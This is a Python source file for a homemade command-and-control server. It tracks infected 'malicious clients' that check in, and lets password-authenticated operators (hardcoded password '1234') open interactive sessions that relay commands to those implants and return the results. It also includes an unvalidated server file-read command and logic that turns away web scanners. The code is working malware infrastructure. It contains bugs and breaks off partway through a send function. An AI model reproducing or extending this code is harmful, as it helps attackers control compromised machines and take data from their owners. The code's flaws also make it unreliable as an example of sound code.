#!/bin/python3
import subprocess as sp
import socket
import threading
import time
import os
import random
import atexit
from datetime import datetime, timezone
import select
import logging
import argparse
import json
import math
import threading
import traceback

# My Modules
import json_parser_dev as json_parser

#import httpserver.httpserver as httpserver

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)

args = parser.parse_args()
ip = args.ip
port = int(args.port)
quiet = args.quiet
fileserverport = args.fileserverport

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False
    
##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())
    

################
## Initial Handler
################ 
    """
    This is the first thing that friendly, and malicious clients talk to. 
    
    Flow:
    (this is a loop)
    |                      / if header is !_client_! -> (new thread) ServerMaliciousClientHandler                  \                            |
    | Receive connection -> if HTTP request, redirect to website (in this case, youtube)                             | Else: throw logging.warn | Loop
    | (start_server)       \ if header is !_userlogin_!, login handler -> (new thread) ServerFriendlyClientHandler /                            |
    
    """

class ServerSockHandler:
    def __init__(self):
        logging.debug(f"===== Startup | Reference Time (UTC) {datetime.now(timezone.utc)} =====")
        self.server_password = "1234"
        ##Errors relevant to this funtion
        self.Sx01 = "conn_broken_pipe: A pipe was broken"
        self.Sx02 = "Socket Close: The socket was successfully closed"
        self.Sx03 = "Socket Timeout: The socket timed out"
        self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
        self.Sx05 = "Connection Refused, Reset or aborted: "
        self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"
        self.SxXX = "Unkown error: "
        ## Other Values
        self.http_redirect = "https://youtube.com"
        ##== Clients & lists
        self.clients = {}
        self.current_clients = []
        self.friendly_current_clients = []
        self.friendly_clients = {}

        ## per-client details
        self.client_type = None
        self.id = None
        self.message = None

        ## Modules
        ## This compiles the JSON schema and returns it
        self.json_parser = json_parser.json_ops()
    def start_server(self, ip, port):
        """
        Description: This is the starting point for this class, it listens for connections,
        and passes them off to connection_handler()
                        
        ip (str): The IP for the server to listen on
        port (int): The port for the server to listen on
        """
    ##== Initial Connection (these are server connections, NOT client connetions)
        
    ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
    ## custom protocol stuff - who knows
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (ip,port)
            self.server.bind(self.ADDR)
            ## A cleanup function incase of crash/on exit
            atexit.register(self.socket_cleanup)
            ## starting listener
            self.server.listen()
            self.connection_handler()
            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
        except PermissionError as e:
            logging.warning(f"{self.Sx04}: \nERRMSG:{e}\n")
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
        except Exception as e:
            logging.warning(f"ERRMSG: {e}\n")
                
    def socket_cleanup(self):
        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
        & no errors are run into. Left fairly empty for now, may have more use in the future.
            
        Called by start_server
            """
        try:
            ## closing the connection
            self.server.close()
            logging.debug(self.Sx02)
        except Exception as e:
            logging.warning(f"{self.SxXX}:{e}")                
        
    def connection_handler(self):
        """The loop that handles the conections, and passes them off to respective threads/classes
            
        It's a bit messy
            
        """
        while True:
        ##== Initial  handling of client
            try:
                self.conn, addr = self.server.accept()

                ## Getting client id from the client, and the IP address
                self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
                logging.debug(f"[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
                        
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                logging.warning(f"[Server (connection_handler)] Client {self.client_remote_ip_port} disconnected")
            except Exception as e:
                logging.debug("[Server (connection_handler)] Unkown Error: {e}")                

        ##== Parsing the message sent to the server
            try:
                self.response = self.recieve_msg_global()

                incoming_message = self.json_parser.convert_and_validate(self.response)
                
                if incoming_message: 
                    self.client_type = incoming_message["Main"]["general"]["client_type"]
                    self.id = incoming_message["Main"]["general"]["client_id"]
                    self.message = incoming_message["Main"]["msg"]["msg_content"]["command"]
                    ## action to be performed
                    self.action = incoming_message["Main"]["general"]["action"]

                ## Nuke connection
                else:
                    print("closing conn")
                    self.conn.close()


                ##== parsing client response, if valid
                ## this: !_client_!\|/AADDB\|/Command should turn into -> [!_client_!, AADDB, Command]
                '''response_list = []
                for i in self.response:
                    response_list.append(i)                    
                ##response_list again for reference: [!_client_!, AADDB, Command]
                self.client_type, self.id, self.message = response_list
                logging.debug(f"[Server] Client Established: {self.client_remote_ip_port} id={self.id}")'''

            except Exception as e:
                """ These can go away, defined in init
                self.client_type = "None"
                self.message = "None"
                self.id = "None"
                """
                logging.debug(f"No message, or ID value was recieved. , error={e}")
                             
        ##== The decision handler based on the client_type, which can be:
            ## !_clientlogin_!: A malicious client "logging" in
            ## !_userlogin_!: A friendly client trying to log in    
            
            ## == Decisions based on parsed messages
            if self.action == "!_userlogin_!":
                username, password = None, None
                try:
                    # Try to extract the username and password from the message
                    #username, password = self.id, self.message
                    username = self.id = incoming_message["Main"]["general"]["client_id"]
                    password = self.id = incoming_message["Main"]["general"]["password"]
                except ValueError as e:
                    # If there is a value error, set the username and password to None
                    logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
                except Exception as e:
                    # If there is any other exception, set the username and password to None
                    logging.debug(f"Unknown error with logon process: {e}")


                ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
                friendly_client_name = f"!!~{username}"                    
                ## Running the authentication check, and starting the friendly client thread if successful
                if self.password_eval(password):
                    try:
                        ##== sending the a-ok on successful authentication
                        #self.conn.send(str_encode("0"))

                        self.send_msg_global(msg="0")

                        logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
                        # Add friendly client to current clients list
                        self.friendly_current_clients.append(friendly_client_name)
                            
                        ## This adds the class instance to the globals list, with the name being friendly_client_name. This allows
                        ## it to be accessed in other parts of the code, and is the backbone of how all this works. 
                        ## additionally, this is where the connection is passed off to the ServerFriendlyClientHandler class
                        self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR, self.json_parser)
                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]

                        ## == Thread handler
                        # Create thread for the friendly client's communication
                        threading.Thread(
                            target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                            args=(self.response, username)
                            ).start()

                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                        logging.warning(f"Friendly Client {friendly_client_name} disconnected")
                    except Exception as e:
                        logging.warning(f"[Error]:{e}")
                ## On failed authentication, sending back a 1 & log
                else:
                    self.conn.send(str_encode("1"))
                    logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")                
            
            ## !_client_! handler
            elif self.action == "!_clientlogin_!":
                # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
                client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id

                # If client is not in current clients list, add it
                if client_name not in self.current_clients:
                    self.current_clients.append(client_name)

                    # Create a new malicious client handler instance and add it to the clients dict
                    self.clients[client_name] = ServerMaliciousClientHandler()
                    globals()[client_name] = self.clients[client_name]

                # Create a new thread for this client's communication
                threading.Thread(
                    target=self.clients[client_name].handle_client,
                    args=(self.conn, self.response, self.id)
                    ).start()                    
            ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
            elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                ## I should capture these too and see whos hitting it
                ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
                self.conn.close()
                logging.debug("Recieved HTTP Request to C2 server... closing connection")
                
            else:
                logging.critical(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {self.response} ")
                self.conn.close()

    def password_eval(self, password=None) -> bool:
        """
        The password eval function. returns true if successful. Will be encrypted when I get around to that

        password (str): the password given by the client
        """
        ## decrypt pass
        _password = str(password)
        if _password == None:
            logging.debug("[Server (password_eval)] Password with value of 'None' passed to the password eval function")
        
        ## the else covers my ass for any potential injection/rifraff with the None parameter
        else:
            if _password == self.server_password:
                return True
            else:
                return False

    """
    These are a much condensed, ugly af implementation of WIWP
    """
    def send_msg_global(self, msg: str):
        ## No need to add conn to args here, don't fully remember the reason
        ## lazy fix to map self.conn to conn
        conn = self.conn
        HEADER_BYTES = 10
        BUFFER = 1024
        msg_length = len(msg)
        header = str_encode(str(msg_length).zfill(HEADER_BYTES))  # .encode()
        logging.debug(f"[Server (send_msg_global: {self.id})] SENDING HEADER: {header}")
        conn.send(header)
        chunks = math.ceil(msg_length / BUFFER)
        for i in range(0, chunks):
            try:
                ## gets the right spot in the message in a loop
                chunk = msg[i * BUFFER:(i + 1) * BUFFER]
                logging.debug(f"[Server (send_msg_global: {self.id})] SENDING CHUNK {i + 1}/{chunks}")
                conn.send(str_encode(chunk))
            except Exception as e:
                logging.debug(f"[Server (send_msg_global: {self.id})] error sending: {e}")

    def recieve_msg_global(self) -> str:
        conn = self.conn
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024
        msg_bytes_recieved_so_far = 0
        logging.debug(f"[Server (recieve_msg_global: {self.id})] WAITING ON HEADER TO BE SENT:")
        header_msg_length = conn.recv(HEADER_BYTES).decode()  # int(bytes_decode(msg)
        logging.debug(f"[Server (recieve_msg_global: {self.id})] HEADER: {header_msg_length}")
        ## getting the amount of chunks/iterations eneded at 1024 bytes a message
        chunks = math.ceil(int(header_msg_length) / BUFFER)
        complete_msg = ""  # bytes_decode(msg)[10:]
        for i in range(0, chunks):
            logging.debug(
                f"[Server (recieve_msg_global: {self.id})] WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
            msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
            ## getting the amount of bytes sent so far
            msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(bytes_decode(msg))
            complete_msg += bytes_decode(msg)

            ## if complete_msg is the same length as what the headers says, consider it complete.
            if len(complete_msg) == header_msg_length:
                logging.debug(f"[Server (recieve_msg_global: {self.id})] MSG TRANSFER COMPLETE")

        return complete_msg

################
## Friendly client
################ 
    """
    Desc:  This class is called on a per friendly client basis, and handles all the data needed
    for each respective client.
    
    
    Flow: (in a loop)
                                        if header is !_servercommand_!, server_decision_tree -> action on server -> sends back to friendly client
                                        /
    friendly_client_communication, recv msg     
                                        \
                                         if header is !_clientcommand_! client_decision_tree -> command sent to client -> client action, sends back to server -> server sends to friendly client
    """                 


class ServerFriendlyClientHandler:

    def __init__(self, conn, addr, json_parser):
        ## Init variables so error messages don't error out if called b4 they are assigned :)
        self.conn = conn
        self.addr = addr
        self.ip = self.addr[0]
        self.port = self.addr[1]
        self.current_client_list = None
        self.authenticated = None
        self.json_parser = json_parser

        self.Sx21 = f"[Friendly Client: {self.ip}:{self.port}] conn_broken_pipe: A pipe was broken f"

    
    def friendly_client_communication(self, message, username):
        """
        This function handles the incoming messages from the friednly client,
        and directs them on where to go based on the header

        headers are: !_clientcommand_! and !_servercommand_!
            client controls a client, and server controls a server

        Common keys user here are:
        ["Main"]["general"]["action"]: Action sending party wants to perform
        ["Main"]["general"]["client_id"]: client ID of SENDING party
        ["Main"]["msg"]["msg_content"]["command"]: command of msg
        ["Main"]["msg"]["msg_content"]["value"]: value of command (opt)
        ["Main"]["msg"]["msg_to"]: For who/which client the msg is intended for
        """
        self.username = username
        logging.debug(f"[Server (ServerFriendlyClientHandler)]Friendly Client authenticated, user={self.username}")

        while message:
            raw_user_input = self.recieve_msg_from_friendlyclient()

            ## Substitute with json decoder
            msg_from_fclient = self.json_parser.convert_and_validate(json_string=raw_user_input)
            if not msg_from_fclient:
                self.send_msg_to_friendlyclient(msg="[Server] Error with JSON validation: ")
            #user_input = self.parse_msg_for_server(raw_user_input)

            logging.debug(f"[client ({self.username}) -> Server] {raw_user_input}")
            try:

                user_header = msg_from_fclient["Main"]["general"]["action"]
                user_username = msg_from_fclient["Main"]["general"]["client_id"]

                user_command = msg_from_fclient["Main"]["msg"]["msg_content"]["command"]
                user_command_value = msg_from_fclient["Main"]["msg"]["msg_content"]["value"]
                msg_to = msg_from_fclient["Main"]["msg"]["msg_to"]

                logging.debug(f"[Server (ServerFriendlyClientHandler)] user_header={user_header}, user_command={user_command}")

                if user_header == "!_servercommand_!":
                    #logging.debug("[!_servercommand_!]")
                    self.server_decision_tree(user_command)

                ##client name is always last for future compatability
                elif user_header == "!_clientcommand_!":
                    #logging.debug("[!_clientcommand_!]")
                    self.client_decision_tree(client_command=user_command, client_command_value=user_command_value, msg_to=str(msg_to))

            except KeyError as ke:
                """Key errors incase json gets f*cked up in transmission - theoretically should never get to this point 
                if properly validated with JSON checker code"""
                logging.debug(f"[Server (ServerFriendlyClientHandler)] JSON Error: {ke}")
                print(traceback.format_exc())
            except Exception as e:
                err_str = f"[Server (ServerFriendlyClientHandler) - confusing error message, fallback error from the decsision trees -] input={raw_user_input}: {e}"
                logging.debug(err_str)
                print(traceback.format_exc())
                self.send_msg_to_friendlyclient(err_str)

################
## Server Decision tree
################ 
    def server_decision_tree(self, message):
        """
        Handles commands meant directly for the server
        
        Note: 
            The try/exceot with message.split() is for checking if the message contains a command for
            the client, or the server. Client commands have 3 parts to their command, while server commands
            are a one word/no spaces command, see example below
            
            Server:
                export-clients
            Client:
                set-heartbeat 15 CLIENT_123.324.135.135
            
        """
        self.current_client_refresh()

        logging.debug(f"[Server (server_decision_tree)] Message from friendly client: {message}")

        #logging.debug(f"[Server (server_decision_tree)] command: {message}")
        if message == "clients":
            if self.current_client_list != "":
                self.send_msg_to_friendlyclient(self.current_client_list)
                
            else:
                self.send_msg_to_friendlyclient("No Current Clients")   
                                 
        elif message == "sanity-check":
            funnymsg = "BANG BANG... hmmm, yep it works! [This message was sent from the server]" \
                "If you see this & a lot of 'I Hate Buzzwords;' then everything between you and the server is working!"                
            funny_msg_big = ("I Hate Buzzwords;") * 2048                
            self.send_msg_to_friendlyclient(f"{funnymsg}\n\n{funny_msg_big}")    
                        
        elif message == "balls":
            funny_msg = "I see you've reqeuested a lot of data from our ML, AI" \
                "Integrated, Algorythmic Next Gen earth shattering orchestration appliance firewall IDS XDR XD EDR SOAR IPS, "\
                "Here's the data it returned:"                    
            funny_msg_big = ("I Hate Buzzwords;") * 2048                
            #self.send_msg_to_friendlyclient(f"{funny_msg}{funny_msg_big}")
            self.send_msg_to_friendlyclient("test?")

        elif message == "disconnect":
            self.send_msg_to_friendlyclient(self.json_format(cmd_value="[Server] Disconnecting from server"))
            time.sleep(1)
            self.clean_exit()
                                     
        ################
        ## Export Commands
        ## These reutrn JSON data about stuff
        ################ 
        
        elif message == "export-clients":
            ## Expots MaliciousClients as JSON, may be a replacement to stats
            try:
                with open("server_json.json", "r+") as json_file:
                    ## json to json obj, json obj to string for sending
                    data = json.dumps(json.load(json_file))
                    self.send_msg_to_friendlyclient(data)
                    logging.debug("[Server (export-clients)]: Success")
                    
            except Exception as e:
                logging.debug(f"[Server (export-clients)] Error with exporting client data: {e}")
                self.send_msg_to_friendlyclient(f"[Server (export-clients)] Error with exporting client data: {e}")
                
        elif "server-download-file" in message:
            logging.debug("[Server (download file)]: Downloading file called")                
            try:
                filepath = message[1]
                ## maybe get some input validation here. because server runs as root, you could totally hijack it by reading passwd files etc
                file_data = self.fileread(filepath)
                self.send_msg_to_friendlyclient(file_data) 
               
            except Exception as e:
                self.send_msg_to_friendlyclient(f"[Server (server-download-file)] Error with downloading file: {e}")    
                            
        elif message == "stats":
            pass
            """
            for i in current_client_list
                client = globals()[i]
                return_stats_list.append(client.data_list)
            """
        elif message == "":
            self.send_msg_to_friendlyclient("Client sent nothing")   
                     
        else:
            ## if not meant for the server, filter down
            self.client_decision_tree(message)
            #self.send_msg_to_friendlyclient("Command not found")
            #elf.client_decision_tree(message)

    def current_client_refresh(self) -> None:
        """
        Checks & adds any new clients to the self.current_client_list list
        """
        self.current_client_list = ""
        for current_client in globals():
            if current_client.startswith("client_"):
                self.current_client_list += f"{current_client}\n"


################
## Client decision tree
################ 
    """
    ## If the job is not meant for the server, it filters down to here.
    ## this interacts with the self.clients interact function, which sets jobs 
    ## for the event loop to do on heartbeats

    ## TLDR: This sets jobs or gets current data from the current selected client

    #                                       Action       Value  Target Client 
    #requests/raw messages look like this: set-heartbeat 15 client_127_0_0_1_FCECW

    ['## ==' tag meaning]:

        Static: a set command or subset of commands: ie: get-data can only use stats, or connection
            (aka rigid/less customizable)
        Dynamic: a command that can take a wide range of values, ie: set-heartbeat X, X can be any number
        
        To client/from server: where the message/command is coming from/going to
        
        validated: command is in a working state accross all 3 pieces (RAT, Server, Client)
        
        [Windows only]/[Linux only]: commands that only work on windows/limux
        
        
    #### =================== INGORE THE ABOVE SHIT ========================
    
    NEW DOCUMENTATION:
    
    if the command is not meant for the server, (aka is not session), it filters down here.
    The session command exists down here, and it's job is to provide an interactive session with the client. 
    
    The way cobalt does it is you send a command, and every checkin you get a result. 
    The way I'm doing it is different. The client still checks in every X time, (and you can set jobs - need to figure that out)
    but you can also spawn an instant session on the client with the session command. Basically, at the next checkin, a session will be spawned
    with the selected client
    
    command works like this: session 0 client name
        !! ignore the 0, but still include it, it's a placeholder for nothing
    
    

    """
    def client_decision_tree(self, msg_to="", client_command="", client_command_value=""):
        #logging.debug(f"[Client Decision Tree]: {raw_message}")
        #message = self.parse_msg_for_client(raw_message)


        try:
            client_command = client_command
            client_command_value = client_command_value
            client_name = msg_to
        except Exception as e:
            logging.debug(f"[Server (client_decision_tree)] Error in command for client: {e}")

        logging.debug(f"[client ({self.username }) -> server] command:{client_command} value:{client_command_value} name:{client_name}")

        try:
            self.client = globals()[client_name]
        except:
            logging.debug(f"[Server (client_decision_tree)] client {self.client} not found")

        if not client_name in self.current_client_list:
            logging.debug(f"[Server] Client {self.client} not found")


        '''
        This needs to be reworked with JSON stuff
        '''

        if client_command == "session":
            """
            Session is kind of special, it's a self contained command in that it does all the processing needed
            within this for loop.
            """
            # setting current_job variable for stat purposes
            self.client.under_control = True
            self.send_msg_to_friendlyclient(self.json_format(cmd_value=f"Session on {self.client.fullname} opened"))

            ## telling client to go into a listening loop, client sends back an okay, otherwise this hangs
            ## as it's waiting for a response

            ## this needs to get moved to JSON... or just pass along the JSON
            #self.client.send_msg_to_maliciousclient("session")

            ## creating JSON to send to client
            self.client.send_msg_to_maliciousclient(self.json_format(cmd="session"))
            
            while True: #self.client.under_control:
                #logging.debug(f"[Server (session with {self.client.fullname})]")
                try:
                    ## Need to re-do client to shut up & listen (aka not reconnect) when not getting the "wait" command


                    logging.debug("[Server (Session: )] Waiting on command from friendly client")
                    raw_session_message = self.recieve_msg_from_friendlyclient()

                    ## load json:
                    dict_session_message = json.loads(raw_session_message)


                    ## validate JSON?


                    ## Special variables for sessions only
                    session_command = dict_session_message["Main"]["msg"]["msg_content"]["command"]
                    session_command_value = dict_session_message["Main"]["msg"]["msg_content"]["value"]

                    ## Strip JSON of any sensitive data (makes it so the messages from Fclient can be passed
                    ## directly to the Mclient without an additional parser here. Orrrrr just don't send it in the first
                    ##place, and this could be a backup?

                    '''
                    dict_session_message["Main"]["general"]["client_id"] = ""
                    dict_session_message["Main"]["general"]["password"] = ""
                    dict_session_message["conn"]["client_ip"] = ""
                    dict_session_message["conn"]["clinet_port"] = ""
                    
                    # or
                    for i in key_to_exclude: ##<< this could be a setting/profile thing passed here
                    ## figure out how to do nested keys like this
                        dict_session_message[i] = ""
                    
                    '''

                    # Updating GUI with latest session command
                    #self.client_stats_update(current_job=f"{session_command}", client_name=client_name)

                    ## if session_command_key = break
                    if session_command == "break":
                        logging.debug(f"[Server (session: {self.client.fullname})] : Session breaking")
                    else:
                        ## Get JSON-ified
                        #self.client.send_msg_to_maliciousclient(session_command)
                        self.client.send_msg_to_maliciousclient(self.json_format(cmd=session_command, cmd_value=session_command_value))

                        ##listening back for response
                        results = self.client.recieve_msg_from_maliciousclient()
                        ## sending JSON from client directly back to fclient, which will handle the parsing
                        self.send_msg_to_friendlyclient(results)

                except ValueError as ve:
                    logging.warning(f"[Server (session)] Error with JSON data: {ve}")
                except KeyError as ke:
                    logging.warning(f"[Server (session)] Key error, most likely invalid, or misformed JSON; Error: {ke} \n "
                                    f"Data received (should be JSON): {raw_session_message}")
                except Exception as e:
                    print(e)
        
        ## if command unknown, wait
        else:
            logging.debug[f"[Server -> Client (name)] Command unknown, Wait"]
            #self.client.send_msg_to_maliciousclient(f"wait\\|/wait")
            ##listening back for response
            #results = self.client.recieve_msg_from_maliciousclient()

        self.client_stats_update(current_job=f"{client_command} {client_command_value}", client_name=client_name)

    def client_stats_update(self, current_job="", client_name=""):
        """ An easy way to update the stats on a client, this edits the json file directly
            Easier to do it here than from the maliciousclienthandlerclass, plus on any errors,
            this part breaks, not the client handler
        """
        logging.debug(f"[Server (client_stats_update: {client_name})] Updating JSON data for this client")

        #json_update(keyname=None, value=None, parent_key=None, client_name=None)
        Data.json_update(keyname="CurrentJob", value=current_job, parent_key="MaliciousClientHandler", client_name=client_name)
        Data.json_update(keyname="LatestCheckin", value=datetime.now(timezone.utc), parent_key="MaliciousClientHandler", client_name=client_name)

################
## MSG to Friendly Client stuff
################ 
    """ 
    These are meant to be called upon independently, yes they can work together if hardcoded, but when you need to send something,
    use send, and when you need to receive, use recieve
    """

    def send_msg_to_friendlyclient(self, msg:str):
        ## lazy fix to map self.conn to conn
        conn = self.conn
        
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024
        
        ## get the length of the message in bytes
        msg_length = len(msg)
        
        ## create a header for the message that includes the length of the message
        header = str_encode(str(msg_length).zfill(HEADER_BYTES))#.encode()
        
        ## send the header followed by the message in chunks
        logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] SENDING HEADER: {header}")
        try:
            conn.send(header)
        except BrokenPipeError as bpe:
            logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] Broken pipe, friendly client most likely disconnected, or crashed, closing thread: {bpe}")
            ## kills thread, need to make a cleaner way to do this
            exit()

        except Exception as e:
            logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] Error when sending message: {e}")

        chunks = math.ceil(msg_length/BUFFER)
        for i in range(0, chunks):
            try:
                ## gets the right spot in the message in a loop
                chunk = msg[i*BUFFER:(i+1)*BUFFER]
                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] SENDING CHUNK {i+1}/{chunks}")
                conn.send(str_encode(chunk))
            except Exception as e:
                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] error sending: {e}")
        
        
        ## does not need to receive any data from client atm. this just sends it back
        #recv_msg = self.recieve_msg_from_friendlyclient(conn)
        #return recv_msg

    # Receive msg form freindly client
    def recieve_msg_from_friendlyclient(self) -> str:
        conn = self.conn
        complete_msg = ""
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024
        header_value = 0
        header_contents = ""
        
        msg_bytes_recieved_so_far = 0
        
        #print(f"WAITING ON HEADER TO BE SENT:")
        header_msg_length = conn.recv(HEADER_BYTES).decode() #int(bytes_decode(msg)
        logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] HEADER: {header_msg_length}")
        
        ## getting the amount of chunks/iterations eneded at 1024 bytes a message
        ## init chunks as 0 incase it errors out
        chunks = 0
        try:
            chunks = math.ceil(int(header_msg_length)/BUFFER)
        except ValueError as ve:
            logging.debug(f"[Server (recieve_msg_from_friendlyclient: {self.username})] Error calculating chunk size: {ve}")
            ## test exit to prevent server crash... not sure how this will work & is not the best way to handle it
            logging.debug("[Server (recieve_msg_from_friendlyclient)] Bad disconnect, killing thread & connection")
            #exit()
            self.clean_exit(name=self.username)

        except Exception as e:
            logging.debug(f"[Server (recieve_msg_from_friendlyclient: {self.username})] Unkown Error: {e}")

        complete_msg = "" #bytes_decode(msg)[10:]
        
        #while True:
        for i in range(0, chunks):

            logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
            msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
            
            ## getting the amount of bytes sent so far
            msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(bytes_decode(msg))

            complete_msg += bytes_decode(msg)

            
            '''print(f"""DEBUG:
                Full Message Length (based on header value) {header_msg_length}
                Header size: {HEADER_BYTES}

                Size of message recieved so far: {msg_bytes_recieved_so_far}  
                
                Chunks: {chunks}          
                
                """)'''
            
            ## if complete_msg is the same length as what the headers says, consider it complete. 
            if len(complete_msg) == header_msg_length:
                logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] MSG TRANSFER COMPLETE")

        return complete_msg

    def json_format(self, action="", cmd="", cmd_value="", msg_to="", client_id=""):
        '''
        JSON formatter for sending messages to the server

        Returns a stringified json object

        '''

        ## Expanded our here for readability
        user_msg_to_be_sent = {
            "Main": {
                "general": {
                    "action": "",
                    "client_id": "",
                    "client_type": "malicious",
                    "password": "empty"
                },
                "conn": {
                    "client_ip": "",
                    "client_port": ""
                },
                "msg": {
                    "msg_to": "msg_to",
                    "msg_content": {
                        "command": cmd,
                        "value": cmd_value
                    },
                    "msg_length": 1234,
                    "msg_hash": "hash of message (later)"
                },
                "stats": {
                    "latest_checkin": "time.now",
                    "device_hostname": "hostname",
                    "device_username": "username"
                },
                "security": {
                    "client_hash": "hash of client (later)",
                    "server_hash": "hash of server (later)"
                }
            }
        }

        ## returns json object as a string
        return json.dumps(user_msg_to_be_sent)

    def fileread(self, filepath=""):        
        if os.path.isfile(filepath):
            with open(filepath, "r") as file_to_read:
                file_data = file_to_read.read()  
                return file_data
        else:
            logging.debug(f"[Friendly Client (fileread)] File does not exist at: {filepath}")
        
    def filewrite(self, filepath="", data=""):
        if os.path.exists(filepath):
            with open(filepath, "w") as file_to_write:
                file_to_write.write(data)  
            
        else:
            logging.debug(f"[Friendly Client (filewrite)] Directory does not exist at: {filepath}")

    def clean_exit(self, name=""):
        logging.debug(f"[Server (ServerFriendlyClientHandler: clean_exit)] clean_exit called, initiating disconnect from '{name}'")
        try:
            self.conn.close()

        except Exception as e:
            logging.warning("[Server (ServerFriendlyClientHandler: clean_exit)] Error closing connection")

        exit()

################
## Malicious Client Handler
################ 
"""
    
    Desc: This class doesn't do much actively, and only gets called on when its created, and when a message needs to be sent to a client via the send_msg. 
    Basically, it's a glorified object for each client that holds the connection info, the connection, and can send/receieve messages with that client.
    It's a work in progress. 
    
    Additionally, and this is newer, it updates JSON keys for the malicious client, with info on said malicious client for GUI stuff (i.e. client viewer)
"""


## perclient & interact left
class ServerMaliciousClientHandler:
    """
    This is the class that handles all the malicious clients, a new instance is spawned for 
    each client that checks in.
    """
    def __init__(self):
        self.first_time = 0
        # setting current job to none to start


        ## stats
        self.stats_heartbeats = 0
        self.stats_heartbeat_timer = 15
        self.stats_jobsrun = 0
        self.stats_latestcheckin = 0

        ## errors
        self.Sx12 = "[Server] A malicious client tried to connect without a valid ID:"


    def handle_client(self, conn, message, id):
        self.conn = conn
        self.ip = self.conn.getpeername()[0]
        self.port = self.conn.getpeername()[1]
        self.id = id
        ## ugly yes, but it works for now. 
        self.fullname = "client_" + self.ip.replace(".","_") + f"_{self.id}"
        self.under_control = False
        self.current_job = "Wait"
        
        self.data_list = [
            self.stats_heartbeats,
            self.stats_heartbeat_timer,
            self.stats_jobsrun,
            self.stats_latestcheckin
        ]

        self.handle_stats()


    def handle_stats(self):
        new_client = {
            "ClientFullName": f"{self.fullname}",
            "ClientIP": f"{self.ip}",
            "ClientPort": f"{self.port}",
            "ClientId": f"{self.id}",
            "CurrentJob": f"{self.current_job}",
            "SleepTime": f"{self.stats_heartbeat_timer}",
            "LatestCheckin": str(datetime.now(timezone.utc)),
            "FirstCheckin": str(datetime.now(timezone.utc)),
            "Active": "yes"
        }
        ## Runs every checkin, howeer the method will not write data if a record of this client exists
        Data.json_new_client(json.dumps(new_client))

    def cleanup(self):
        self.current_job = "wait\\|/wait"
    
    def send_msg_to_maliciousclient(self, msg:str):
        ## lazy fix to map self.conn to conn
        conn = self.conn
        
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024
        
        ## get the length of the message in bytes
        msg_length = len(msg)
        
        ## create a header for the message that includes the length of the message
        header = str_encode(str(msg_length).zfill(HEADER_BYTES))#.encode()
        
        ## send the header followed by the message in chunks
        logging.debug(f"[Server (send_msg_to_maliciousclient: {self.id})] SENDING HEADER: {header}")
        conn.send(header)

        chunks = math.ceil(msg_length/BUFFER)
        for i in range(0, chunks):
            
            try:
                ## gets the right spot in the message in a loop
                chunk = msg[i*BUFFER:(i+1)*BUFFER]
